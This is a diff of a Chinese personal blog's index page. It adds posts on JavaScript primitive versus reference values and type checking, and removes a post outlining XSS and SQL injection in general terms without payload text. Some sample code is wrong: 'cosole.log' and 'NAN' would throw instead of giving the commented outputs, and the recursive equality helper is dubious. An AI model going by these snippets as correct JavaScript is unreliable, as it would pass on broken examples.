@@ -187,6 +187,224 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/" class="post-title-link" itemprop="url">原始值与引用值及确定类型</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-14 15:04:04 / 修改时间：16:21:25" itemprop="dateCreated datePublished" datetime="2022-04-14T15:04:04+08:00">2022-04-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="原始值和引用值"><a href="#原始值和引用值" class="headerlink" title="原始值和引用值"></a>原始值和引用值</h1><p>ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。</p>
+<p>引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。</p>
+<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="动态属性"><a href="#动态属性" class="headerlink" title="动态属性"></a>动态属性</h2><p>引用值可以随时添加，修改删除属性。</p>
+<p>而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1=<span class="string">&quot;Nicholas&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> name2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;Matt&quot;</span>);</span><br><span class="line">name1.age=<span class="number">27</span>;</span><br><span class="line">name2.age=<span class="number">26</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name1.age);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(name2.age);<span class="comment">//26</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name1);<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name2);<span class="comment">//object</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="复制值"><a href="#复制值" class="headerlink" title="复制值"></a>复制值</h2><p>通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> num2=num1;</span><br></pre></td></tr></table></figure>
+
+<p>num1和num2相互独立，num2是num1的副本</p>
+<p>当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">let</span> obj2=obj1;</span><br><span class="line">obj1.name=<span class="string">&quot;Nic&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj2.name);<span class="comment">//Nic</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTen</span>(<span class="params">num</span>)</span>&#123;<span class="comment">//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count</span></span><br><span class="line">    num+=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> res=addTen(count);</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//20，没有变化</span></span><br><span class="line"><span class="built_in">console</span>.log(res);<span class="comment">//30</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是对象：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">	obj.name=<span class="string">&quot;Nic&quot;</span>；<span class="comment">//此时多了一个obj指针指向person,将name改为Nic</span></span><br><span class="line">    obj=<span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">//又创建一个指针，指向内存其他位置</span></span><br><span class="line">    obj.name=<span class="string">&quot;Greg&quot;</span>;<span class="comment">//函数调用结束，obj被销毁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setName(person);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//&#x27;Nic&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><p>typeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object</p>
+<p>typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。</p>
+<h1 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h1><p>如果变量是给定引用类型的实例，则instanceof操作符返回true</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//变量person是Object吗</span></span><br></pre></td></tr></table></figure>
+
+<p>按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/" class="post-title-link" itemprop="url">原始值与引用值及确定类型</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-14 15:04:04" itemprop="dateCreated datePublished" datetime="2022-04-14T15:04:04+08:00">2022-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-02 22:42:33" itemprop="dateModified" datetime="2022-05-02T22:42:33+08:00">2022-05-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="原始值和引用值"><a href="#原始值和引用值" class="headerlink" title="原始值和引用值"></a>原始值和引用值</h1><p>ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。</p>
+<p>引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。</p>
+<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="动态属性"><a href="#动态属性" class="headerlink" title="动态属性"></a>动态属性</h2><p>引用值可以随时添加，修改删除属性。</p>
+<p>而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1=<span class="string">&quot;Nicholas&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> name2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;Matt&quot;</span>);</span><br><span class="line">name1.age=<span class="number">27</span>;</span><br><span class="line">name2.age=<span class="number">26</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name1.age);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(name2.age);<span class="comment">//26</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name1);<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name2);<span class="comment">//object</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="复制值"><a href="#复制值" class="headerlink" title="复制值"></a>复制值</h2><p>通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> num2=num1;</span><br></pre></td></tr></table></figure>
+
+<p>num1和num2相互独立，num2是num1的副本</p>
+<p>当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">let</span> obj2=obj1;</span><br><span class="line">obj1.name=<span class="string">&quot;Nic&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj2.name);<span class="comment">//Nic</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTen</span>(<span class="params">num</span>)</span>&#123;<span class="comment">//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count</span></span><br><span class="line">    num+=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> res=addTen(count);</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//20，没有变化</span></span><br><span class="line"><span class="built_in">console</span>.log(res);<span class="comment">//30</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是对象：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">	obj.name=<span class="string">&quot;Nic&quot;</span>；<span class="comment">//此时多了一个obj指针指向person,将name改为Nic</span></span><br><span class="line">    obj=<span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">//又创建一个指针，指向内存其他位置</span></span><br><span class="line">    obj.name=<span class="string">&quot;Greg&quot;</span>;<span class="comment">//函数调用结束，obj被销毁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setName(person);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//&#x27;Nic&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><p>typeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object</p>
+<p>typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。</p>
+<h1 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h1><p>如果变量是给定引用类型的实例，则instanceof操作符返回true</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//变量person是Object吗</span></span><br></pre></td></tr></table></figure>
+
+<p>按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。</p>
+<h1 id="对象标识和相等判定"><a href="#对象标识和相等判定" class="headerlink" title="对象标识和相等判定"></a>对象标识和相等判定</h1><p>ES6之前：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(+<span class="number">0</span>===-<span class="number">0</span>);<span class="comment">//true</span></span><br><span class="line">cosole.log(NAN===NAN);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
+
+<p>ES6中的object.is()与===很像，但同时考虑了上述边界情形，这个方法接收两个参数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(<span class="literal">true</span>,<span class="number">1</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(&#123;&#125;,&#123;&#125;));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(+<span class="number">0</span>,-<span class="number">0</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(NAN,NAN));<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+
+<p>检查超过两个值是否相等</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursiveEqual</span>(<span class="params">x,...rest</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.is(x,rest[<span class="number">0</span>])||(rest.length&lt;<span class="number">2</span>||recursiveEqual(...rest));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor:"></a>constructor:</h1><p>constructor两个作用，</p>
+<ul>
+<li>判断数据的类型</li>
+<li>对象实例通过prototype对象上的constructor访问它的构造函数，因此如果改变prototype对象，constructor就不能用来判断数据类型</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((<span class="number">2</span>).constructor === <span class="built_in">Number</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log((<span class="literal">true</span>).constructor === <span class="built_in">Boolean</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log((<span class="string">&#x27;str&#x27;</span>).constructor === <span class="built_in">String</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(([]).constructor === <span class="built_in">Array</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;).constructor === <span class="built_in">Function</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log((&#123;&#125;).constructor === <span class="built_in">Object</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"> </span><br><span class="line">Fn.prototype = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Fn();</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(f.constructor===Fn);    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(f.constructor===<span class="built_in">Array</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Object-prototype-toString-call"><a href="#Object-prototype-toString-call" class="headerlink" title="Object.prototype.toString.call()"></a>Object.prototype.toString.call()</h1><p>Object.prototype.toString.call()使用Object对象的原型方法toString来判断数据类型</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="number">2</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">true</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="string">&#x27;str&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call([]));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(&#123;&#125;));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">undefined</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">null</span>));</span><br></pre></td></tr></table></figure>
+
+<p>注意：同样是检测对象obj调用toString方法，obj.toString()的结果和Object.prototype.toString.call(obj)的结果不一样，这是因为toString是Object的原型方法，而Array,function等类型作为Object的实例，都重写了toString()方法，不同的对象类型调用toString方法时，根据原型链的知识，调用的是对应的重写之后的toString()方法，（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串…），而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转换为字符串类型；因此，在想要得到对象的具体类型时，应该调用Object原型上的toString方法。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1131,260 +1349,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">针对Web的攻击技术</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-12 18:09:24" itemprop="dateCreated datePublished" datetime="2022-04-12T18:09:24+08:00">2022-04-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-23 00:01:12" itemprop="dateModified" datetime="2022-08-23T00:01:12+08:00">2022-08-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/" itemprop="url" rel="index"><span itemprop="name">HTTP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="针对Web应用的攻击模式"><a href="#针对Web应用的攻击模式" class="headerlink" title="针对Web应用的攻击模式"></a>针对Web应用的攻击模式</h1><ul>
-<li>主动攻击</li>
-<li>被动攻击</li>
-</ul>
-<h2 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h2><p>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj1.png"></p>
-<h2 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h2><p>被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj2.png"></p>
-<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击</p>
-<h3 id="跨站脚本攻击可能造成的影响"><a href="#跨站脚本攻击可能造成的影响" class="headerlink" title="跨站脚本攻击可能造成的影响"></a>跨站脚本攻击可能造成的影响</h3><ul>
-<li>利用虚假输入的表单骗取用户个人信息</li>
-<li>利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求</li>
-<li>显示伪造的文章或图片</li>
-</ul>
-<p>eg:</p>
-<p>在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj3.png"></p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj4.png"></p>
-<h3 id="对用户Cookie的窃取"><a href="#对用户Cookie的窃取" class="headerlink" title="对用户Cookie的窃取"></a>对用户Cookie的窃取</h3><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj5.png"></p>
-<h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><p>会执行非法SQL的SQL注入攻击</p>
-<h3 id="造成影响："><a href="#造成影响：" class="headerlink" title="造成影响："></a>造成影响：</h3><ul>
-<li>非法查看或篡改数据库内的数据</li>
-<li>规避认证</li>
-<li>执行和数据库服务业务关联的程序等</li>
-</ul>
-<p>eg:</p>
-<p>某购物网站可将坐着名字作为搜索关键字查找他的所有著作</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj6.png"></p>
-<p>结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示</p>
